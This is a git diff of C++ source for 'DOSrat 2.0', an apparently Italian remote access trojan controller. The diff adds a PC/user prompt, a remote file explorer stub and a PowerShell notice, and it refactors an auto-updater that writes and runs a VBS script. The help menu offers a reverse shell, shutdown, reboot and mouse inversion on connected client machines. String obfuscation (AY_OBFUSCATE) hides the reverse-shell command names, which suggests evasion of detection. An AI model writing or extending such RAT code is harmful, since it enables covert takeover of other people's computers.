@@ -20,7 +20,7 @@ void StampaTitolo(short Returns = 0)
     tc.SetColor(tc.Default);
 }
 
-void StampaPrefix(string NomeClient = "")
+void StampaPrefix(string PC = "", string USER = "")
 {
     TextColor tc;
 
@@ -28,11 +28,15 @@ void StampaPrefix(string NomeClient = "")
     cout << "DOSrat 2.0";
     tc.SetColor(tc.Default);
 
-    if (NomeClient != "")
+    if (PC != "")
     {
         cout << " [";
         tc.SetColor(tc.Purple);
-        cout << NomeClient;
+        cout << PC;
+        tc.SetColor(tc.Default);
+        cout << "->";
+        tc.SetColor(tc.Purple);
+        cout << USER;
         tc.SetColor(tc.Default);
         cout << "]";
     }
@@ -163,21 +167,34 @@ bool AutoAggiornamento()
     GitHub gh;
     DirUtils du;
     SystemUtils su;
+    string UpdateVBS = "";
+    string MFP = du.GetModuleFilePath();
 
-    if (!du.CheckDir(du.GetModuleFilePath() + "Update"))
-        du.MakeDir(du.GetModuleFilePath() + "Update");
+    if (!du.CheckDir(MFP + "Update"))
+        du.MakeDir(MFP + "Update");
 
-    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", du.GetModuleFilePath() + "Update\\"))
+    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", MFP + "Update\\"))
         return false;
 
-    su.NoOutputCMD("PowerShell Expand-Archive '" + du.GetModuleFilePath() + "Update\\DOSrat2.0.zip' '" + du.GetModuleFilePath() + "Update' -force");
+    su.NoOutputCMD("PowerShell Expand-Archive '" + MFP + "Update\\DOSrat2.0.zip' '" + MFP + "Update' -force");
 
-    du.DelFile(du.GetModuleFilePath() + "Update\\DOSrat2.0.zip");
+    du.DelFile(MFP + "Update\\DOSrat2.0.zip");
 
-    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWScript.Sleep 1000\nWshShell.Run \"\"\"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\"\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
+    UpdateVBS += "WScript.Sleep 2500\n";
+    UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+    UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
+    UpdateVBS += "filesys.DeleteFile \"" + MFP + "DOSrat 2.0.exe\"\n";
+    UpdateVBS += "filesys.DeleteFile \"" + MFP + "Build\\Client.exe\"\n";
+    UpdateVBS += "filesys.MoveFile \"" + MFP + "Update\\DOSrat 2.0.exe\", \"" + MFP + "DOSrat 2.0.exe\"\n";
+    UpdateVBS += "filesys.MoveFile \"" + MFP + "Update\\Build\\Client.exe\", \"" + MFP + "Build\\Client.exe\"\n";
+    UpdateVBS += "WScript.Sleep 1000\n";
+    UpdateVBS += "WshShell.Run \"\"\"" + MFP + "DOSrat 2.0.exe\"\"\", 1, false\n";
+    UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";
+
+    if(!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
         return false;
 
-    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
+    su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");
 
     return true;
 }
@@ -555,6 +572,10 @@ bool ReverseShell(SOCKET Sock)
                 StampaTitolo(1);
                 cli.SubTitle("Sessione Comandi", 60, tc.Green);
             }
+            else if (ToLowerCase(Cmd) == "powershell")
+            {
+                cout << "Non puoi eseguire usa sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
+            }
             else
             {
                 Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
@@ -575,6 +596,16 @@ bool ReverseShell(SOCKET Sock)
     return false;
 }
 
+bool FileExplorer(SOCKET Sock)
+{
+    CliFileExplorer cfe;
+
+    cfe.PrintLayout();
+    system("pause");
+
+    return false;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -588,7 +619,7 @@ void Sessione(int ID, SOCKET Sock)
 
     for (bool Controllo = true; Controllo;)
     {
-        StampaPrefix(Clients[ID].info.UserName);
+        StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
         getline(cin, cmd);
         cmd = ToLowerCase(cmd);
 
@@ -597,7 +628,7 @@ void Sessione(int ID, SOCKET Sock)
         if (cmd == "help")
         {
             cout << endl;
-            cli.SubTitle("Client", 20, tc.Blue);
+            cli.SubTitle("Client", 30, tc.Blue);
             StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
             StampaHelp("Killclient\t", "- Termina il processo del Client.");
             cout << char(192) << char(196) << "Kill" << endl;
@@ -608,16 +639,18 @@ void Sessione(int ID, SOCKET Sock)
             cout << char(192) << char(196) << "Restart" << endl;
             cout << endl;
 
-            cli.SubTitle("System", 20, tc.Lime);
+            cli.SubTitle("System", 30, tc.Lime);
             StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
             StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
             StampaHelp("Shutdown\t", "- Spegne il PC.");
             StampaHelp("Reboot\t\t", "- Riavvia il PC.");
 			StampaHelp((string)AY_OBFUSCATE("Reverseshell\t"), "- Lancia comandi sulla shell del PC remoto.");
             cout << char(192) << char(196) << "Revshell" << endl;
+            StampaHelp("filexplorer\t", "- Gestisci i file del PC remoto.");
+            cout << char(192) << char(196) << "explorer" << endl;
             cout << endl;
 
-            cli.SubTitle("Utility", 20, tc.Purple);
+            cli.SubTitle("Utility", 30, tc.Purple);
             StampaHelp("Exit\t", "- Torna al menu principale.");
             cout << char(192) << char(196) << "Close" << endl;
             StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
@@ -699,6 +732,17 @@ void Sessione(int ID, SOCKET Sock)
         else if (cmd == (string)AY_OBFUSCATE("reverseshell") || cmd == "revshell")
         {
             if (!ReverseShell(Sock))
+                Controllo = CheckConnection(Sock, ID);
+        }
+        else if (cmd == "filexplorer" || cmd == "explorer")
+        {
+            bool tmp = FileExplorer(Sock);
+
+            system("cls");
+            StampaTitolo(1);
+            cli.SubTitle("Sessione Comandi", 60, tc.Green);
+
+            if (!tmp)
                 Controllo = CheckConnection(Sock, ID);
         }
         else
